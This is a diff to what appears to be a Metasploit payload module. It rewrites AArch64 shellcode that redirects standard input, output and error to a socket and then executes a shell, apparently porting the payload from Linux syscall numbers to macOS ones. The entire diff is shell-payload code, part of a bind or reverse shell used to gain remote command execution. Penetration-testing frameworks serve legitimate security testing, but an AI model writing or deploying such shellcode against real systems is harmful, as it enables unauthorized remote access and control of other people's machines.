@@ -26,23 +26,23 @@ module MetasploitModule
             0xaa0c03e0,          #  mov	x0, x12
             0xd2800002,          #  mov	x2, #0x0                   	// #0
             0xd2800001,          #  mov	x1, #0x0                   	// #0
-            0xd2800308,          #  mov	x8, #0x18                  	// #24
+            0xd2800b50,          #  mov	x16, #0x5a                  	// #90
             0xd4000001,          #  svc	#0x0
             0xd2800021,          #  mov	x1, #0x1                   	// #1
-            0xd2800308,          #  mov	x8, #0x18                  	// #24
+            0xd2800b50,          #  mov	x16, #0x5a                  	// #90
             0xd4000001,          #  svc	#0x0
             0xd2800041,          #  mov	x1, #0x2                   	// #2
-            0xd2800308,          #  mov	x8, #0x18                  	// #24
+            0xd2800b50,          #  mov	x16, #0x5a                  	// #90
             0xd4000001,          #  svc	#0x0
             0x10000140,          #  adr	x0, 54 <shell>
             0xd2800002,          #  mov	x2, #0x0                   	// #0
             0xf90003e0,          #  str	x0, [sp]
             0xf90007e2,          #  str	x2, [sp,#8]
             0x910003e1,          #  mov	x1, sp
-            0xd2801ba8,          #  mov	x8, #0xdd                  	// #221
+            0xd2800770,          #  mov	x16, #0x3b                  	// #59
             0xd4000001,          #  svc	#0x0
             0xd2800000,          #  mov	x0, #0x0                   	// #0
-            0xd2800ba8,          #  mov	x8, #0x5d                  	// #93
+            0xd2800030,          #  mov	x16, #0x1                   	// #1
             0xd4000001,          #  svc	#0x0
             0x00000000,          #  .word	0x00000000                // shell
             0x00000000,          #  .word	0x00000000
